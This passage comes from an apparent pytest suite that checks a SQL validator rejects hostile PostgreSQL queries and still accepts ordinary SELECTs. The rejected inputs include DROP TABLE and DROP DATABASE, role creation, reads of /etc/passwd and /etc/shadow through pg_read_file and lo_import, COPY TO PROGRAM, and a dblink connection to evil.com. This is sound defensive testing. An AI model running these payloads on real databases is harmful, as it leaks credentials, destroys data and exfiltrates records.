        assert_rejected("SELECT version() FROM system_secrets")

    def test_func_07(self):
        assert_rejected("SELECT current_setting('data_directory') FROM system_secrets")

    def test_func_08(self):
        assert_rejected("SELECT current_setting('hba_file') FROM system_secrets")

    def test_func_09(self):
        assert_rejected("SELECT inet_server_addr() FROM system_secrets")

    def test_func_10(self):
        assert_rejected("SELECT inet_server_port() FROM system_secrets")

    def test_func_11(self):
        assert_rejected("SELECT pg_postmaster_start_time() FROM system_secrets")

    def test_func_12(self):
        assert_rejected("SELECT pg_backend_pid() FROM system_secrets")

    def test_func_13(self):
        assert_rejected("SELECT pg_get_userbyid(10) FROM system_secrets")

    def test_func_14(self):
        assert_rejected("SELECT pg_get_keywords() FROM system_secrets")

    def test_func_15(self):
        assert_rejected("SELECT pg_get_expr(adbin, adrelid) FROM pg_attrdef")

    def test_func_16(self):
        assert_rejected("SELECT pg_get_indexdef(oid) FROM pg_index")

    def test_func_17(self):
        assert_rejected("SELECT pg_get_viewdef(oid) FROM pg_views")

    def test_func_18(self):
        assert_rejected("SELECT pg_get_ruledef(oid) FROM pg_rules")

    def test_func_19(self):
        assert_rejected("SELECT pg_get_functiondef(oid) FROM pg_proc")


# ============================================================================
# 10. DDL/DML injection (25 tests)
# ============================================================================

class TestDDLDMLInjection:
    """Direct DDL and DML statements that must be rejected."""

    def test_ddl_00(self):
        assert_rejected("INSERT INTO users (username, email) VALUES ('hacker', 'hack@evil.com')")

    def test_ddl_01(self):
        assert_rejected("UPDATE users SET is_active = false WHERE id = 1")

    def test_ddl_02(self):
        assert_rejected("DELETE FROM users WHERE id = 1")

    def test_ddl_03(self):
        assert_rejected("DROP TABLE users")

    def test_ddl_04(self):
        assert_rejected("DROP TABLE IF EXISTS users")

    def test_ddl_05(self):
        assert_rejected("DROP DATABASE eisenhower")

    def test_ddl_06(self):
        assert_rejected("CREATE TABLE hack (id int, data text)")

    def test_ddl_07(self):
        assert_rejected("CREATE TABLE hack AS SELECT * FROM users")

    def test_ddl_08(self):
        assert_rejected("ALTER TABLE users ADD COLUMN backdoor text")

    def test_ddl_09(self):
        assert_rejected("ALTER TABLE users DROP COLUMN password_hash")

    def test_ddl_10(self):
        assert_rejected("ALTER TABLE users RENAME TO users_backup")

    def test_ddl_11(self):
        assert_rejected("TRUNCATE TABLE users")

    def test_ddl_12(self):
        assert_rejected("CREATE INDEX idx_hack ON users (username)")

    def test_ddl_13(self):
        assert_rejected("DROP INDEX idx_hack")

    def test_ddl_14(self):
        assert_rejected("CREATE VIEW hack AS SELECT * FROM users")

    def test_ddl_15(self):
        assert_rejected("DROP VIEW hack")

    def test_ddl_16(self):
        assert_rejected("CREATE SEQUENCE hack_seq")

    def test_ddl_17(self):
        assert_rejected("DROP SEQUENCE hack_seq")

    def test_ddl_18(self):
        assert_rejected("GRANT ALL ON users TO public")

    def test_ddl_19(self):
        assert_rejected("REVOKE ALL ON users FROM public")

    def test_ddl_20(self):
        assert_rejected("CREATE ROLE hacker WITH LOGIN PASSWORD 'hack123'")

    def test_ddl_21(self):
        assert_rejected("DROP ROLE hacker")

    def test_ddl_22(self):
        assert_rejected("CREATE EXTENSION IF NOT EXISTS hstore")

    def test_ddl_23(self):
        assert_rejected("DROP EXTENSION IF EXISTS hstore")

    def test_ddl_24(self):
        assert_rejected("MERGE INTO users USING (SELECT 1 AS id) AS src ON users.id = src.id DO UPDATE SET is_active = false")


# ============================================================================
# 11. Information schema access (15 tests)
# ============================================================================

class TestInformationSchemaAccess:
    """Access to system schemas and information_schema."""

    def test_info_00(self):
        assert_rejected("SELECT column_name FROM information_schema.columns WHERE table_name = 'users'")

    def test_info_01(self):
        assert_rejected("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'")

    def test_info_02(self):
        assert_rejected("SELECT routine_name FROM information_schema.routines")

    def test_info_03(self):
        assert_rejected("SELECT table_name FROM information_schema.views")

    def test_info_04(self):
        assert_rejected("SELECT constraint_name FROM information_schema.constraints")

    def test_info_05(self):
        assert_rejected("SELECT usename FROM pg_catalog.pg_shadow")

    def test_info_06(self):
        assert_rejected("SELECT usename FROM pg_catalog.pg_user")

    def test_info_07(self):
        assert_rejected("SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public'")

    def test_info_08(self):
        assert_rejected("SELECT relname FROM pg_catalog.pg_class")

    def test_info_09(self):
        assert_rejected("SELECT * FROM pg_toast.pg_toast_12345")

    def test_info_10(self):
        assert_rejected("SELECT tablename FROM pg_tables WHERE schemaname = 'public'")

    def test_info_11(self):
        assert_rejected("SELECT relname FROM pg_class WHERE relkind = 'r'")

    def test_info_12(self):
        assert_rejected("SELECT attname FROM pg_attribute WHERE attnum > 0")

    def test_info_13(self):
        assert_rejected("SELECT nspname FROM pg_namespace WHERE nspname NOT LIKE 'pg_%'")

    def test_info_14(self):
        assert_rejected("SELECT proname FROM pg_proc WHERE pronamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public')")


# ============================================================================
# 12. File system access (15 tests)
# ============================================================================

class TestFileSystemAccess:
    """Attempts to access the file system through SQL."""

    def test_fs_00(self):
        assert_rejected("COPY (SELECT * FROM users) TO '/tmp/users.csv'")

    def test_fs_01(self):
        assert_rejected("COPY hack FROM '/tmp/hack.sql'")

    def test_fs_02(self):
        assert_rejected("COPY (SELECT * FROM users) TO PROGRAM 'cat /tmp/users.csv'")

    def test_fs_03(self):
        assert_rejected("SELECT pg_read_file('/etc/passwd', 0, 100) FROM system_secrets")

    def test_fs_04(self):
        assert_rejected("SELECT pg_read_file('/etc/shadow', 0, 100) FROM system_secrets")

    def test_fs_05(self):
        assert_rejected("SELECT pg_read_file('postgresql.conf') FROM system_secrets")

    def test_fs_06(self):
        assert_rejected("SELECT pg_read_file('pg_hba.conf') FROM system_secrets")

    def test_fs_07(self):
        assert_rejected("SELECT pg_ls_dir('.') FROM system_secrets")

    def test_fs_08(self):
        assert_rejected("SELECT pg_ls_dir('/etc') FROM system_secrets")

    def test_fs_09(self):
        assert_rejected("SELECT pg_stat_file('/etc/passwd') FROM system_secrets")

    def test_fs_10(self):
        assert_rejected("SELECT pg_read_binary_file('/etc/passwd') FROM system_secrets")

    def test_fs_11(self):
        assert_rejected("SELECT lo_import('/etc/passwd') FROM system_secrets")

    def test_fs_12(self):
        assert_rejected("SELECT lo_export(12345, '/tmp/passwd') FROM system_secrets")

    def test_fs_13(self):
        assert_rejected("SELECT lo_create(99999) FROM system_secrets")

    def test_fs_14(self):
        assert_rejected("SELECT lo_unlink(99999) FROM system_secrets")


# ============================================================================
# 13. Network access (10 tests)
# ============================================================================

class TestNetworkAccess:
    """Attempts to access the network through SQL."""

    def test_net_00(self):
        assert_rejected("SELECT dblink_connect('host=evil.com user=hack password=pass dbname=target') FROM system_secrets")

    def test_net_01(self):
        assert_rejected("SELECT dblink_send('myconn', 'DROP TABLE users') FROM system_secrets")

    def test_net_02(self):
        assert_rejected("SELECT dblink_exec('myconn', 'DROP TABLE users') FROM system_secrets")

    def test_net_03(self):
        assert_rejected("SELECT dblink_open('cur', 'SELECT * FROM users') FROM system_secrets")

    def test_net_04(self):
        assert_rejected("SELECT dblink_fetch('cur', 10) FROM system_secrets")

    def test_net_05(self):
        assert_rejected("SELECT dblink_close('cur') FROM system_secrets")

    def test_net_06(self):
        assert_rejected("SELECT dblink_disconnect('myconn') FROM system_secrets")

    def test_net_07(self):
        assert_rejected("SELECT dblink_error_message('myconn') FROM system_secrets")

    def test_net_08(self):
        assert_rejected("SELECT dblink_get_notify(-1) FROM system_secrets")

    def test_net_09(self):
        assert_rejected("SELECT dblink_get_result('myconn') FROM system_secrets")


# ============================================================================
# 14. Empty/malformed queries (10 tests)
# ============================================================================

class TestEmptyMalformedQueries:
    """Edge cases: empty, whitespace-only, and malformed queries."""

    def test_empty_string(self):
        assert_rejected("")

    def test_whitespace_only(self):
        assert_rejected("   ")

    def test_tab_only(self):
        assert_rejected("\t\t")

    def test_newline_only(self):
        assert_rejected("\n\n")

    def test_comment_only(self):
        assert_rejected("-- This is a comment")

    def test_block_comment_only(self):
        assert_rejected("/* This is a block comment */")

    def test_semicolon_only(self):
        assert_rejected(";")

    def test_multiple_semicolons(self):
        assert_rejected(";;;")

    def test_malformed_sql(self):
        assert_rejected("SELECT FROM WHERE")

    def test_incomplete_select(self):
        assert_rejected("SELECT * FROM")


# ============================================================================
# 15. Valid queries (10 tests)
# ============================================================================

class TestValidQueriesAccepted:
    """Ensure legitimate queries are not false-positive rejected."""

    def test_valid_00(self):
        assert_accepted("SELECT id FROM portfolio_nodes")

    def test_valid_01(self):
        assert_accepted("SELECT id, name FROM portfolio_nodes WHERE id = 1")

    def test_valid_02(self):
        assert_accepted("SELECT id, name FROM portfolio_nodes ORDER BY name")

    def test_valid_03(self):
        assert_accepted("SELECT id FROM portfolio_nodes LIMIT 10")

    def test_valid_04(self):
        assert_accepted("SELECT COUNT(*) FROM portfolio_nodes")

    def test_valid_05(self):
        assert_accepted("SELECT node_type, COUNT(*) FROM portfolio_nodes GROUP BY node_type")

    def test_valid_06(self):
        assert_accepted("SELECT node_type, COUNT(*) AS cnt FROM portfolio_nodes GROUP BY node_type HAVING COUNT(*) > 1")

    def test_valid_07(self):
        assert_accepted("SELECT p.id, t.title FROM portfolio_nodes p JOIN tasks t ON p.id = t.portfolio_node_id")

    def test_valid_08(self):
        assert_accepted("SELECT id FROM portfolio_nodes WHERE id IN (SELECT portfolio_node_id FROM tasks WHERE status = 'open')")

    def test_valid_09(self):
        assert_accepted("WITH active_nodes AS (SELECT id, name FROM portfolio_nodes WHERE percent_complete < 100) SELECT id FROM active_nodes")


# ============================================================================
# 16. Summary
# ============================================================================

class TestFuzzingSummary:
    """Verify the total test count meets the 250+ requirement."""

    def test_minimum_test_count(self):
        """Ensure we have 250+ adversarial SQL test permutations."""
        test_classes = [
            TestMultiTableAliasing,
            TestInlineCommentMasking,
            TestStackedQueries,
            TestNestedSubqueries,
            TestHexUnicodeEvasion,
            TestDataExfiltrationUnion,
            TestTimeBasedBlindInjection,
            TestBooleanBlindInjection,
            TestSystemFunctionAbuse,
            TestDDLDMLInjection,
            TestInformationSchemaAccess,
            TestFileSystemAccess,
            TestNetworkAccess,
            TestEmptyMalformedQueries,
        ]
        total = 0
        for cls in test_classes:
            methods = [m for m in dir(cls) if m.startswith("test_")]
            total += len(methods)
        assert total >= 250, f"Expected 250+ adversarial tests, got {total}"
